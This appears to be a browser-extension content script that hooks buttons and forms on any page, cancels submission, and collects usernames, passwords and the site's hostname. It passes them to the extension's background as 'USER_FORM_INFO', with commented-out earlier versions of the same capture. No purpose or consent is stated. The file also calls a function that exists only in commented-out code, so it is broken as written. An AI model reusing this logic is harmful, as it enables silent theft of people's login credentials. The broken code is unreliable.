/*global chrome*/

// document.addEventListener("submit", (e) => {
//   e.preventDefault()
//   console.log("Tracking...")
//   const form = e.target;
//   const inputs = form.querySelectorAll("input")

//   const data = {}
//   if (inputs) {
//     inputs.forEach((el, i) => {
//       if (el.type == "text" || el.type == "email" || el.type == "password") {
//         data[el.type] = el.value
//       } 
//     })

//     data["site"] = location.hostname
//   }
  
//   // const data = {
//   //   site: location.hostname,
//   //   username: username,
//   //   password: password
//   // }
  
//   console.log("User data", data);
//   chrome.runtime.sendMessage(
//     {
//       type: "USER_FORM_INFO",
//       payload: data
//     },
//     (response) => {
//       console.log("Response ", response)
//     }
//   )
// }, true);

// function clickForm() {
//   const form = document.querySelector("form")
//   const button = form ? form.querySelector("button") : ""
//   const inputs = form ? form.querySelectorAll("input") : ""

//   console.log("FOrm: ", form, button, inputs)

//   if (!form || !button || !inputs) {
//     return
//   }

//   button.addEventListener("click", (e) => {
//     e.preventDefault()
//     console.log("Tracking...")

//     const data = {}
//     if (inputs) {
//       inputs.forEach((el, i) => {
//         if (el.type == "text" || el.type == "email" || el.type == "password") {
//           data[el.type] = el.value
//         }
//       })

//       data["site"] = location.hostname
//     }
  
//     // const data = {
//     //   site: location.hostname,
//     //   username: username,
//     //   password: password
//     // }
  
//     console.log("User data", data);
//     chrome.runtime.sendMessage(
//       {
//         type: "USER_FORM_INFO",
//         payload: data
//       },
//       (response) => {
//         console.log("Response ", response)
//       }
//     )
//   }, true);
// }

function clickInput(){
  const btn = document.querySelector("button") 
  const textInput = document.querySelectorAll("input")
  const btnInput = document.querySelector("input[type='submit']")
  const form = document.querySelector("form")

  if (btn) {
    btn.addEventListener("click", (e) => {
      getData(e,textInput)
    }, true);
  }

  if (btnInput) {
    btnInput.addEventListener("click", (e) => {
      getData(e,textInput)
    })
  }

  if (form) {
    form.addEventListener("submit", (e) => {
      getData(e,textInput)
    })
  }
  
}

function getData(e,textInput) {
  e.preventDefault()
    console.log("Tracking...")

    const data = {}
    if (textInput) {
      textInput.forEach((el, i) => {

        if (el.type == "text" || el.type == "email") {
          data["username"] = el.value
        } 

        if (el.type == "password") {
          data[el.type] = el.value
        }
      })

      data["site"] = location.hostname
    }
    
    // const data = {
    //   site: location.hostname,
    //   username: username,
    //   password: password
    // }
    
    console.log("User data", data);
    chrome.runtime.sendMessage(
      {
        type: "USER_FORM_INFO",
        payload: data
      },
      (response) => {
        console.log("Response ", response)
      }
    )
}


clickForm()
clickInput()